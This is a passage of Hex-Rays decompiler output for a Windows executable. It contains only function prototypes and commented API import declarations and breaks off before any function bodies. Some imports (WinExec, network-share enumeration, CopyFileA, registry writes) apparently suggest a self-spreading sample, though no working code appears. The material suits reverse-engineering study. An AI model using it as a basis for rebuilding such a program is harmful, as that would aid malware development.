/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <math.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

// BOOL __stdcall CloseHandle(HANDLE hObject);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// DWORD __stdcall GetFileType(HANDLE hFile);
// void __stdcall GetSystemTime(LPSYSTEMTIME lpSystemTime);
// DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
// HANDLE __stdcall GetStdHandle(DWORD nStdHandle);
// void __stdcall RaiseException(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments);
// BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// void __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue);
// BOOL __stdcall SetEndOfFile(HANDLE hFile);
// DWORD __stdcall SetFilePointer(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo);
// BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// LPSTR __stdcall CharNextA(LPCSTR lpsz);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// int __stdcall MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
// BOOL __stdcall FindClose(HANDLE hFindFile);
// HANDLE __stdcall FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
// BOOL __stdcall FreeLibrary(HMODULE hLibModule);
// LPSTR __stdcall GetCommandLineA();
// DWORD __stdcall GetLastError();
// int __stdcall GetLocaleInfoA(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData);
// DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// void __stdcall GetStartupInfoA(LPSTARTUPINFOA lpStartupInfo);
// LCID __stdcall GetThreadLocale();
// HMODULE __stdcall LoadLibraryExA(LPCSTR lpLibFileName, HANDLE hFile, DWORD dwFlags);
// int __stdcall LoadStringA(HINSTANCE hInstance, UINT uID, LPSTR lpBuffer, int cchBufferMax);
// LPSTR __stdcall lstrcpyA(LPSTR lpString1, LPCSTR lpString2);
// LPSTR __stdcall lstrcpynA(LPSTR lpString1, LPCSTR lpString2, int iMaxLength);
// int __stdcall lstrlenA(LPCSTR lpString);
// int __stdcall MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// LSTATUS __stdcall RegCloseKey(HKEY hKey);
// LSTATUS __stdcall RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// LSTATUS __stdcall RegQueryValueExA(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// int __stdcall WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
// SIZE_T __stdcall VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
// BSTR __stdcall SysAllocStringLen(const OLECHAR *strIn, UINT ui);
// INT __stdcall SysReAllocStringLen(BSTR *pbstr, const OLECHAR *psz, unsigned int len);
// void __stdcall SysFreeString(BSTR bstrString);
// UINT __stdcall SysStringLen(BSTR pbstr);
// HRESULT __stdcall VariantClear(VARIANTARG *pvarg);
// HRESULT __stdcall VariantCopyInd(VARIANT *pvarDest, const VARIANTARG *pvargSrc);
// HRESULT __stdcall VariantChangeTypeEx(VARIANTARG *pvargDest, const VARIANTARG *pvarSrc, LCID lcid, USHORT wFlags, VARTYPE vt);
int sub_401214();
// HLOCAL __stdcall LocalAlloc(UINT uFlags, SIZE_T uBytes);
// HLOCAL __stdcall LocalFree(HLOCAL hMem);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// void __stdcall InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
int sub_401278();
// _DWORD *__usercall sub_4012C8@<eax>(_DWORD *result@<eax>);
// char __usercall sub_4012D0@<al>(int *@<eax>, int *@<edx>);
// int *__usercall sub_401300@<eax>(int *result@<eax>);
// char __usercall sub_401318@<al>(int *@<eax>, int *@<edx>, int *@<ecx>);
// int *__usercall sub_40138C@<eax>(int *@<eax>, int **@<edx>);
// char __usercall sub_40141C@<al>(int@<eax>, int *@<edx>);
// char __usercall sub_401480@<al>(void *@<eax>, int@<edx>, int *@<ecx>);
// unsigned int *__usercall sub_4014F8@<eax>(unsigned int@<eax>, int@<edx>, unsigned int *@<ecx>);
// LPVOID __usercall sub_4015B0@<eax>(int@<eax>, int@<edx>, unsigned int *@<ecx>);
// unsigned int __usercall sub_401644@<eax>(int@<eax>, int@<edx>, unsigned int *@<ecx>);
// int *__usercall sub_4016C4@<eax>(int@<eax>, int *@<edx>);
// int *__usercall sub_401754@<eax>(void *@<eax>, int@<edx>, unsigned int *@<ecx>);
// char __usercall sub_401878@<al>(int@<eax>, int@<edx>, unsigned int *@<ecx>);
char sub_401904();
void sub_4019C8();
// _DWORD *__usercall sub_401AA8@<eax>(_DWORD *@<eax>);
// int *__usercall sub_401B0C@<eax>(unsigned int@<eax>);
// unsigned int *__usercall sub_401B3C@<eax>(unsigned int *result@<eax>, int@<edx>);
// int __usercall sub_401B6C@<eax>(int@<eax>);
// _DWORD *__usercall sub_401B90@<eax>(_DWORD *@<eax>, int@<edx>);
// int __usercall sub_401BB8@<eax>(int@<eax>);
// int __usercall sub_401C28@<eax>(int *@<eax>);
// int *__usercall sub_401C60@<eax>(unsigned int *@<eax>, int@<edx>);
// unsigned int *__usercall sub_401CF8@<eax>(unsigned int *a1@<eax>, int a2@<edx>);
int sub_401D80();
// char __usercall sub_401DCC@<al>(unsigned int *@<eax>);
// int __usercall sub_401E58@<eax>(int@<eax>);
// int __usercall sub_401E84@<eax>(void *@<eax>, int@<edx>);
// int __usercall sub_401EB8@<eax>(int@<eax>);
// _DWORD *__usercall sub_401EE4@<eax>(int@<eax>);
// _DWORD *__usercall sub_401FD8@<eax>(int@<eax>);
// int __usercall sub_402160@<eax>(int@<eax>);
// unsigned int __usercall sub_402304@<eax>(int@<eax>, int@<edx>);
// char *__usercall sub_4024D4@<eax>(char *a1@<eax>, int a2@<edx>);
// int __usercall sub_402598@<eax>(int result@<eax>);
// int __usercall sub_4025B0@<eax>(int result@<eax>);
// _DWORD *__usercall sub_4025C8@<eax>(_DWORD *result@<eax>, int@<edx>);
// void __usercall __noreturn sub_402618(char@<al>);
void sub_40265C();
// _DWORD *__usercall sub_40267C@<eax>(int@<eax>);
int sub_402698();
// int __usercall sub_4026B0@<eax>(char *@<eax>, char *@<edx>, int@<ecx>);
// char *__usercall sub_4026F0@<eax>(char *@<eax>, char **@<edx>);
// char *__usercall sub_402768@<eax>(int@<eax>, char **@<edx>);
int sub_4027C0();
void __noreturn sub_4027FC(); // weak
// unsigned __int8 __usercall sub_402818@<al>(unsigned __int8 *@<eax>, unsigned __int8 *@<edx>, unsigned __int8@<cl>);
// int __usercall sub_402848@<eax>(char *@<eax>, _BYTE *@<edx>);
// int __usercall sub_402864@<eax>(int result@<eax>, int@<edx>, unsigned int@<ecx>);
// __int16 __usercall sub_4028D4@<ax>(char *@<eax>, int@<edx>, int@<ecx>);
// int __usercall sub_4028F4@<eax>(unsigned int@<eax>);
// char __usercall sub_40290C@<al>(int@<eax>, int@<edx>, _BYTE *@<ecx>);
// char __usercall sub_40296C@<al>(int@<eax>, _BYTE *@<edx>);
// int __usercall sub_402978@<eax>(int result@<eax>, char **@<edx>);
// _BYTE *__usercall sub_402A44@<eax>(_BYTE *result@<eax>, char *@<edx>, char@<cl>);
// int __stdcall GetKeyboardType(int nTypeFlag);
int sub_402A58();
__int16 sub_402A88();
void sub_402B4C();
// int __usercall sub_402B58@<eax>(int@<eax>);
// int __usercall sub_402B5C@<eax>(int result@<eax>, void *@<edx>);
// _DWORD *__usercall sub_402B70@<eax>(int@<eax>);
// int __usercall sub_402B84@<eax>(int *a1@<eax>);
// _DWORD *__usercall sub_402BAC@<eax>(_DWORD *result@<eax>, char@<dl>);
// _DWORD *__usercall sub_402BCC@<eax>(_DWORD *@<eax>, char@<dl>);
// _DWORD *__usercall sub_402BDC@<eax>(_DWORD *result@<eax>);
// _DWORD *__usercall sub_402BE8@<eax>(int@<eax>, _DWORD *@<edx>);
// char __usercall sub_402C40@<al>(int *@<eax>, int@<edx>);
// int __usercall sub_402C58@<eax>(int@<eax>, int@<ebx>);
// void __usercall sub_402C88(int *@<eax>, int@<ebx>);
int sub_402CA0();
// int __usercall sub_402CB4@<eax>(int *@<eax>, _WORD *@<edx>, int (*)(void)@<ebx>);
// int __usercall sub_402CDC@<eax>(int result@<eax>, char a2@<dl>, ...);
// int __usercall sub_402D2C@<eax>(_DWORD *@<eax>);
// _DWORD *__usercall sub_402D34@<eax>(_DWORD *@<eax>);
// _DWORD *__usercall sub_402D3C@<eax>(_DWORD *result@<eax>, char@<dl>);
void sub_402D4C();
// void __usercall sub_402D68(ULONG_PTR a1@<eax>, ULONG_PTR a2@<edx>);
// void __usercall sub_402D9C(ULONG_PTR a1@<ebx>, ULONG_PTR a2@<eax>);
void sub_402DB0();
// void __usercall sub_402DD0(ULONG_PTR a1@<ecx>, ULONG_PTR a2@<edx>, ULONG_PTR a3@<eax>);
void __fastcall sub_402DF8(int, ULONG_PTR);
// void __usercall sub_402E14(ULONG_PTR a1@<eax>, ULONG_PTR a2@<edx>);
// int __usercall sub_402E34@<eax>(EXCEPTION_RECORD *@<ebx>, int@<ebp>, void *@<edi>, ULONG_PTR@<esi>, struct _EXCEPTION_POINTERS ExceptionInfo, int);
int __cdecl sub_402F60(int, ULONG_PTR);
void __stdcall sub_402F98(DWORD, DWORD, DWORD, const ULONG_PTR *);
int __cdecl sub_402FB4(int, int);
void __cdecl sub_403008(int, int, int, int, int, int, int, int, int, int, int, int);
int __stdcall sub_403038(unsigned int, int, int);
// void __usercall __noreturn sub_403050(int@<eax>);
void __stdcall __noreturn sub_40305C(int *);
int __cdecl sub_4030FC(struct _EXCEPTION_POINTERS ExceptionInfo); // idb
// PEXCEPTION_ROUTINE *__usercall sub_403198@<eax>(struct _EXCEPTION_REGISTRATION_RECORD *a1@<ebp>);
int sub_4031B8();
int sub_4031E0();
int sub_403240();
// int __usercall sub_4032A0@<eax>(int@<eax>, int@<edx>, struct _EXCEPTION_REGISTRATION_RECORD *@<ebp>);
// int **__usercall sub_4032D0@<eax>(_DWORD *@<eax>);
// int __usercall sub_4032EC@<eax>(int *@<eax>);
unsigned int sub_40330C();
BOOL __stdcall sub_40335C(int, int, int);
void __noreturn sub_403390();
// void __usercall __noreturn sub_4034B0(int@<eax>);
// void __usercall __noreturn sub_4034BC(int@<eax>);
// _DWORD *__usercall sub_4034C8@<eax>(_DWORD *result@<eax>);
// int __usercall sub_4034EC@<eax>(int result@<eax>, int@<edx>);
// volatile __int32 *__usercall sub_40351C@<eax>(volatile __int32 *result@<eax>, __int32@<edx>);
// volatile __int32 *__usercall sub_403560@<eax>(volatile __int32 *result@<eax>, __int32@<edx>);
// int __usercall sub_40358C@<eax>(int@<eax>);
// _DWORD *__usercall sub_4035B0@<eax>(char **@<eax>, char *@<edx>, int@<ecx>);
// _DWORD *__usercall sub_4035E0@<eax>(int cchWideChar@<ecx>, LPCWCH lpWideCharStr@<edx>, char **@<eax>);
// _DWORD *__usercall sub_403670@<eax>(char **@<eax>);
// _DWORD *__usercall sub_403680@<eax>(char **@<eax>, char *@<edx>);
// _DWORD *__usercall sub_4036B0@<eax>(char **@<eax>, int@<edx>);
// _DWORD *__usercall sub_4036EC@<eax>(char **@<eax>, char *@<edx>);
// _DWORD *__usercall sub_4036F8@<eax>(char **@<eax>, char *@<edx>, int@<ecx>);
// _DWORD *__usercall sub_403710@<eax>(char **a1@<eax>, const WCHAR *a2@<edx>);
// int __usercall sub_403724@<eax>(int result@<eax>);
// char **__usercall sub_40372C@<eax>(char **result@<eax>, __int32@<edx>);
// volatile __int32 *__usercall sub_403770@<eax>(volatile __int32 *@<eax>, char *@<edx>, char *@<ecx>);
// volatile __int32 *__usercall sub_4037E4@<eax>(volatile __int32 *@<eax>, int@<edx>);
// int __usercall sub_403834@<eax>(int result@<eax>, int *@<edx>);
// int __usercall sub_4038D8@<eax>(int result@<eax>);
// char *__usercall sub_4038E8@<eax>(char *result@<eax>);
// char *__usercall sub_4038F4@<eax>(char **@<eax>);
// _DWORD *__userpurge sub_40392C@<eax>(int@<eax>, int@<edx>, int@<ecx>, char **);
// char *__usercall sub_40396C@<eax>(char **@<eax>, int@<edx>, int@<ecx>);
// _BYTE *__usercall sub_4039B4@<eax>(_BYTE *result@<eax>, _BYTE *@<edx>);
// _DWORD *__usercall sub_4039FC@<eax>(char **@<eax>, int@<edx>);
// _DWORD *__usercall sub_403A60@<eax>(_DWORD *@<eax>, char *@<edx>);
// OLECHAR **__usercall sub_403A90@<eax>(OLECHAR **result@<eax>);
// void __usercall sub_403AA8(OLECHAR **@<eax>, int@<edx>);
// OLECHAR **__usercall sub_403ACC@<eax>(OLECHAR **@<eax>, const OLECHAR *@<edx>);
// char __usercall sub_403AF0@<al>(int@<eax>, int@<edx>);
// char __usercall sub_403B1C@<al>(_DWORD *@<eax>, char *@<edx>, int@<ecx>);
// char __usercall sub_403BB0@<al>(_DWORD *@<eax>, char *@<edx>);
// int __usercall sub_403BBC@<eax>(int@<eax>, int@<edx>);
// int *__usercall sub_403BE8@<eax>(int *result@<eax>, char *@<edx>, int@<ecx>);
// int *__usercall sub_403CD0@<eax>(int *@<eax>, char *@<edx>);
// int __usercall sub_403CDC@<eax>(int@<eax>, int@<edx>, int@<ecx>);
// void *__userpurge sub_403DF8@<eax>(volatile __int32 *@<eax>, __int32 *@<edx>, char *@<ecx>, int);
// _DWORD *__usercall sub_403EEC@<eax>(const WCHAR *@<eax>, int@<edx>, char **@<ecx>);
// _DWORD *__usercall sub_403F78@<eax>(OLECHAR *@<eax>, char **@<edx>);
// BSTR __usercall sub_403F9C@<eax>(CHAR *@<eax>);
void __noreturn sub_404020();
// VARIANTARG *__usercall sub_404030@<eax>(VARIANTARG *result@<eax>);
// VARIANT *__usercall sub_404074@<eax>(VARIANT *result@<eax>, VARIANT *@<edx>);
// _DWORD *__usercall sub_4040B2@<eax>(_DWORD *result@<eax>, _DWORD *@<edx>);
int nullsub_2(void); // weak
// void __usercall sub_404110(VARTYPE a1@<cx>, const void *a2@<edx>, VARIANTARG *a3@<eax>);
// int __usercall sub_40417C@<eax>(VARTYPE@<cx>, _WORD *@<edx>, VARIANTARG *@<eax>);
// void __usercall sub_404194(VARTYPE vt@<cx>, VARIANTARG *pvarSrc@<edx>, VARIANTARG *a3@<eax>);
// char *__usercall sub_404238@<eax>(VARIANTARG *@<eax>, int@<edx>);
// VARIANTARG *__usercall sub_404268@<eax>(VARIANTARG *@<eax>, int@<edx>);
// void __usercall sub_404288(VARTYPE vt@<cx>, VARIANTARG *a2@<eax>, VARIANTARG *a3@<edx>);
// volatile __int32 *__usercall sub_40437C@<eax>(volatile __int32 *@<eax>, VARIANTARG *@<edx>);
// void __usercall sub_4043B8(VARIANTARG *a1@<eax>);
// VARIANT *__usercall sub_4043C0@<eax>(VARIANT *result@<eax>);
// int __usercall sub_4043E4@<eax>(int result@<eax>);
// int __usercall sub_4043EC@<eax>(int@<eax>);
// void *__userpurge sub_4043F4@<eax>(volatile __int32 *@<eax>, __int32 *@<edx>, char *@<ecx>, int);
// int *__usercall sub_404404@<eax>(int *result@<eax>, char *@<edx>, int@<ecx>);
// int *__usercall sub_40440C@<eax>(int *@<eax>, int@<edx>);
// int *__userpurge sub_404414@<eax>(int *@<eax>, int@<edx>, int@<ecx>, int *);
// int *__usercall sub_4045A0@<eax>(int *@<eax>, int@<edx>, int@<ecx>, int);
// int *__usercall sub_4045AC@<eax>(int *result@<eax>, int@<edx>);
// int *__usercall sub_4045E8@<eax>(int *result@<eax>, int@<edx>, int@<ecx>);
// PVOID __usercall sub_404610@<eax>(const void *@<eax>);
// int __usercall sub_404638@<eax>(int result@<eax>);
// const CHAR *__usercall sub_40465C@<eax>(const CHAR *result@<eax>);
// CHAR *__usercall sub_404670@<eax>(CHAR *a1@<eax>);
// HMODULE __usercall sub_404818@<eax>(const CHAR *@<eax>);
// _DWORD *__usercall sub_404A14@<eax>(int@<eax>);
// int __usercall sub_404A1C@<eax>(int@<eax>);
// _DWORD *__usercall sub_404A24@<eax>(int@<eax>);
// int __usercall sub_404A44@<eax>(int result@<eax>);
// int __usercall sub_404AA4@<eax>(int@<eax>);
// _DWORD *__usercall sub_404B00@<eax>(_DWORD *result@<eax>);
// _DWORD *__usercall sub_404B10@<eax>(_DWORD *@<eax>);
// int **__usercall sub_404B80@<eax>(int **result@<eax>, char **@<edx>);
// _DWORD *__usercall sub_404BD8@<eax>(_DWORD *result@<eax>);
// int *__usercall sub_404BF0@<eax>(int *result@<eax>, int@<edx>);
// DWORD __stdcall GetCurrentThreadId();
// DWORD __usercall sub_404C14@<eax>(int@<eax>);
int sub_404C40();
// DWORD __usercall sub_404C43@<eax>(int@<eax>, DWORD@<ecx>);
// DWORD __usercall sub_404C70@<eax>(int@<eax>);
// DWORD __usercall sub_404C88@<eax>(int a1@<eax>);
// char *__usercall sub_404E16@<eax>(_DWORD *a1@<eax>, char *a2@<edx>);
// DWORD __userpurge sub_404EB8@<eax>(int@<eax>, void *@<edx>, int@<ecx>, DWORD *);
// DWORD __userpurge sub_404F1C@<eax>(int@<eax>, const void *@<edx>, int@<ecx>, DWORD *);
// int __usercall sub_404F80@<eax>(int result@<eax>);
// _DWORD *__usercall sub_404FBC@<eax>(int@<eax>, int@<edx>);
// _DWORD *__usercall sub_404FFE@<eax>(int@<eax>);
// _DWORD *__usercall sub_405005@<eax>(int@<eax>);
// _DWORD *__usercall sub_40500C@<eax>(int@<eax>, int@<edx>, int@<ecx>);
int sub_4050B7();
// _DWORD *__usercall sub_40510D@<eax>(int@<eax>, int@<edx>);
// _DWORD *__usercall sub_405124@<eax>(int@<eax>, int@<edx>);
// _DWORD *__usercall sub_40512E@<eax>(int@<eax>);
// _DWORD *__usercall sub_405144@<eax>(_DWORD *result@<eax>, char *@<edx>, signed int@<ecx>);
// _DWORD *__usercall sub_4051AF@<eax>(_DWORD *result@<eax>, signed int@<edx>);
// int __usercall sub_40520F@<eax>(_DWORD *@<eax>);
// _DWORD *__usercall sub_40528C@<eax>(_DWORD *@<eax>, char *@<edx>);
// int __usercall sub_4052BC@<eax>(int result@<eax>);
// int __userpurge sub_405590@<eax>(int@<eax>, int, int);
// int __userpurge sub_4055D6@<eax>(__int64 _RAX@<edx:eax>, unsigned int, int);
// int __userpurge sub_405680@<eax>(unsigned __int64 _RAX@<edx:eax>, unsigned __int64);
// unsigned int __userpurge sub_4056C9@<eax>(__int64 _RAX@<edx:eax>, unsigned int a2, int a3);
// unsigned int __userpurge sub_405775@<eax>(unsigned __int64 _RAX@<edx:eax>, unsigned __int64);
int sub_405818();
int sub_405880();
// DWORD __stdcall GetModuleFileNameA_0(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// HMODULE __stdcall GetModuleHandleA_0(LPCSTR lpModuleName);
// HLOCAL __stdcall LocalAlloc_0(UINT uFlags, SIZE_T uBytes);
// LPVOID __stdcall TlsGetValue(DWORD dwTlsIndex);
// BOOL __stdcall TlsSetValue(DWORD dwTlsIndex, LPVOID lpTlsValue);
BOOL sub_4059A0();
LPVOID sub_4059F0();
_DWORD *sub_405A34();
// int __usercall sub_405A80@<eax>(int@<eax>, struct _EXCEPTION_REGISTRATION_RECORD *@<ebp>);
int sub_405AB4();
void sub_405AE4();
// BOOL __stdcall GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer);
// LSTATUS __stdcall RegCloseKey_0(HKEY hKey);
// LSTATUS __stdcall RegCreateKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD Reserved, LPSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
// LSTATUS __stdcall RegFlushKey(HKEY hKey);
// LSTATUS __stdcall RegOpenKeyExA_0(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// LSTATUS __stdcall RegQueryValueExA_0(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// LSTATUS __stdcall RegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// BOOL __stdcall CloseHandle_0(HANDLE hObject);
// int __stdcall CompareStringA(LCID Locale, DWORD dwCmpFlags, PCNZCH lpString1, int cchCount1, PCNZCH lpString2, int cchCount2);
// BOOL __stdcall CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
// HANDLE __stdcall CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
// HANDLE __stdcall CreateFileA_0(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// void __stdcall DeleteCriticalSection_0(LPCRITICAL_SECTION lpCriticalSection);
// BOOL __stdcall DeleteFileA(LPCSTR lpFileName);
// void __stdcall EnterCriticalSection_0(LPCRITICAL_SECTION lpCriticalSection);
// BOOL __stdcall EnumCalendarInfoA(CALINFO_ENUMPROCA lpCalInfoEnumProc, LCID Locale, CALID Calendar, CALTYPE CalType);
// BOOL __stdcall FileTimeToDosDateTime(const FILETIME *lpFileTime, LPWORD lpFatDate, LPWORD lpFatTime);
// BOOL __stdcall FileTimeToLocalFileTime(const FILETIME *lpFileTime, LPFILETIME lpLocalFileTime);
// BOOL __stdcall FindClose_0(HANDLE hFindFile);
// HANDLE __stdcall FindFirstFileA_0(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
// BOOL __stdcall FindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
// DWORD __stdcall FormatMessageA(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list *Arguments);
// UINT __stdcall GetACP();
// BOOL __stdcall GetCPInfo(UINT CodePage, LPCPINFO lpCPInfo);
// BOOL __stdcall GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize);
// DWORD __stdcall GetCurrentDirectoryA(DWORD nBufferLength, LPSTR lpBuffer);
// HANDLE __stdcall GetCurrentProcess();
// DWORD __stdcall GetCurrentProcessId();
// HANDLE __stdcall GetCurrentThread();
// DWORD __stdcall GetCurrentThreadId_0();
// int __stdcall GetDateFormatA(LCID Locale, DWORD dwFlags, const SYSTEMTIME *lpDate, LPCSTR lpFormat, LPSTR lpDateStr, int cchDate);
// BOOL __stdcall GetDiskFreeSpaceA(LPCSTR lpRootPathName, LPDWORD lpSectorsPerCluster, LPDWORD lpBytesPerSector, LPDWORD lpNumberOfFreeClusters, LPDWORD lpTotalNumberOfClusters);
// DWORD __stdcall GetLastError_0();
// void __stdcall GetLocalTime(LPSYSTEMTIME lpSystemTime);
// int __stdcall GetLocaleInfoA_0(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData);
// DWORD __stdcall GetModuleFileNameA_1(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// HMODULE __stdcall GetModuleHandleA_1(LPCSTR lpModuleName);
// FARPROC __stdcall GetProcAddress_0(HMODULE hModule, LPCSTR lpProcName);
// DWORD __stdcall GetShortPathNameA(LPCSTR lpszLongPath, LPSTR lpszShortPath, DWORD cchBuffer);
// UINT __stdcall GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize);
// DWORD __stdcall GetTempPathA(DWORD nBufferLength, LPSTR lpBuffer);
// LCID __stdcall GetThreadLocale_0();
// DWORD __stdcall GetTimeZoneInformation(LPTIME_ZONE_INFORMATION lpTimeZoneInformation);
// LANGID __stdcall GetUserDefaultLangID();
// BOOL __stdcall GetVersionExA(LPOSVERSIONINFOA lpVersionInformation);
// UINT __stdcall GetWindowsDirectoryA(LPSTR lpBuffer, UINT uSize);
// ATOM __stdcall GlobalAddAtomA(LPCSTR lpString);
// HGLOBAL __stdcall GlobalAlloc(UINT uFlags, SIZE_T dwBytes);
// ATOM __stdcall GlobalDeleteAtom(ATOM nAtom);
// ATOM __stdcall GlobalFindAtomA(LPCSTR lpString);
// HGLOBAL __stdcall GlobalFree(HGLOBAL hMem);
// LPVOID __stdcall GlobalLock(HGLOBAL hMem);
// HGLOBAL __stdcall GlobalHandle(LPCVOID pMem);
// HGLOBAL __stdcall GlobalReAlloc(HGLOBAL hMem, SIZE_T dwBytes, UINT uFlags);
// BOOL __stdcall GlobalUnlock(HGLOBAL hMem);
// void __stdcall InitializeCriticalSection_0(LPCRITICAL_SECTION lpCriticalSection);
// void __stdcall LeaveCriticalSection_0(LPCRITICAL_SECTION lpCriticalSection);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// int __stdcall MulDiv(int nNumber, int nNumerator, int nDenominator);
// BOOL __stdcall ReadFile_0(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// BOOL __stdcall RemoveDirectoryA(LPCSTR lpPathName);
// BOOL __stdcall SetEndOfFile_0(HANDLE hFile);
// BOOL __stdcall SetFileAttributesA(LPCSTR lpFileName, DWORD dwFileAttributes);
// DWORD __stdcall SetFilePointer_0(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// BOOL __stdcall SetPriorityClass(HANDLE hProcess, DWORD dwPriorityClass);
// BOOL __stdcall SetThreadPriority(HANDLE hThread, int nPriority);
// void __stdcall Sleep(DWORD dwMilliseconds);
// DWORD __stdcall VerLanguageNameA(DWORD wLang, LPSTR szLang, DWORD cchLang);
// SIZE_T __stdcall VirtualQuery_0(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
// DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
// UINT __stdcall WinExec(LPCSTR lpCmdLine, UINT uCmdShow);
// BOOL __stdcall WriteFile_0(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// DWORD __stdcall WNetEnumResourceA(HANDLE hEnum, LPDWORD lpcCount, LPVOID lpBuffer, LPDWORD lpBufferSize);
// DWORD __stdcall WNetOpenEnumA(DWORD dwScope, DWORD dwType, DWORD dwUsage, LPNETRESOURCEA lpNetResource, LPHANDLE lphEnum);
// HBITMAP __stdcall CreateBitmap(int nWidth, int nHeight, UINT nPlanes, UINT nBitCount, const void *lpBits);
// HBRUSH __stdcall CreateBrushIndirect(const LOGBRUSH *plbrush);
// HBITMAP __stdcall CreateCompatibleBitmap(HDC hdc, int cx, int cy);
// HDC __stdcall CreateCompatibleDC(HDC hdc);
// HBITMAP __stdcall CreateDIBitmap(HDC hdc, const BITMAPINFOHEADER *pbmih, DWORD flInit, const void *pjBits, const BITMAPINFO *pbmi, UINT iUsage);
// HFONT __stdcall CreateFontIndirectA(const LOGFONTA *lplf);
// HPALETTE __stdcall CreatePalette(const LOGPALETTE *plpal);
// HPEN __stdcall CreatePenIndirect(const LOGPEN *plpen);
// BOOL __stdcall DeleteDC(HDC hdc);
// BOOL __stdcall DeleteObject(HGDIOBJ ho);
// LONG __stdcall GetBitmapBits(HBITMAP hbit, LONG cb, LPVOID lpvBits);
// BOOL __stdcall GetCurrentPositionEx(HDC hdc, LPPOINT lppt);
// int __stdcall GetDIBits(HDC hdc, HBITMAP hbm, UINT start, UINT cLines, LPVOID lpvBits, LPBITMAPINFO lpbmi, UINT usage);
